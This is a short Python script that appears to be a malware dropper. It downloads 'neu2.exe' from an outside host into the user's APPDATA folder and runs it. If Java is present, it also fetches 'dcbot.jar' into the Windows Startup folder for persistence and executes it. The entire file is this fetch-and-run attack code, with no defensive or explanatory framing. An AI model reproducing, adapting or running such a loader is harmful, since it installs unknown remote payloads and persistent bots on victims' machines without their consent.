import urllib.request
import subprocess
import os


url = "https://kekw.battleb0t.xyz/neu2.exe"

filename = "neu2.exe"

appdata_path = os.getenv("APPDATA")

filepath = os.path.join(appdata_path, filename)

response = urllib.request.urlopen(url)
with open(filepath, 'wb') as out_file:
    data = response.read()
    out_file.write(data)

subprocess.call([filepath])

try:
    output = subprocess.check_output(["java", "-version"], stderr=subprocess.STDOUT)
except subprocess.CalledProcessError as e:
    output = e.output


if b"java version" in output:

    url = "https://kekw.battleb0t.xyz/dcbot"

    filename = "dcbot.jar"

    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    filepath = os.path.join(startup_path, filename)

    response = urllib.request.urlopen(url)
    with open(filepath, 'wb') as out_file:
        data = response.read()
        out_file.write(data)

    subprocess.call(["java", "-jar", filepath], cwd=startup_path)

